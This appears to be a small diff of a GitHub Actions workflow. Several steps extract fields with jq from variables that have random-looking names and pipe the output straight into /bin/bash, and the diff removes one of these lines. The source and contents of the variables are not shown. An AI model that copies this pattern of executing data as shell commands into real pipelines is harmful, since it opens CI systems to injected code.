@@ -23,7 +23,6 @@ jobs:
           echo $h411 | jq -r .kbvsz1165 | /bin/bash
           printf '%s' "$d5" | jq -r .rvcxm475 | /bin/bash
           echo $j30 | jq -r .jjw6824 | /bin/bash
-          printf '%s' "$ahud6" | jq -r .opt7 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
